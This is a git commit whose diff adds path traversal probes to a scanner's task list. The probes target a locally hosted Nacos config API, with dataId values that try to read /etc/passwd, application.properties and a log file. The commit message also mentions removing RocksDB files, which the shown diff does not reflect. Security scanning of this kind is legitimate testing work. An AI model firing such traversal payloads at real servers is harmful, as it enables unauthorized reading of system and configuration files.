c2f229df162dda58952ba436b2ea45b7e829a1b4
Jason <394404228@qq.com>
2025-12-04 21:57:32 +1100

    Remove obsolete RocksDB option files and add path traversal probes for Nacos config API in the scanner scheduler.

--- scanner/scheduler.py
+++ scanner/scheduler.py
@@ -8,7 +8,11 @@ tasks = [
     {"url": "http://demo-app:8080/actuator/info", "name": "demo-info"},
     {"url": "http://demo-app:8080/actuator/env", "name": "demo-env"},
     {"url": "http://localhost:8848/nacos/v1/cs/configs", "name": "nacos-configs"},
-    {"url": "http://localhost:8848/nacos", "name": "nacos-console"}
+    {"url": "http://localhost:8848/nacos", "name": "nacos-console"},
+    # Path traversal/file read probes for Nacos config API
+    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../../../../../etc/passwd&group=DEFAULT_GROUP", "name": "nacos-etc-passwd"},
+    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../conf/application.properties&group=DEFAULT_GROUP", "name": "nacos-app-props"},
+    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../logs/nacos.log&group=DEFAULT_GROUP", "name": "nacos-log-file"}
 ]
 
 print("Pushing tasks to redis queue 'tasks' ...")
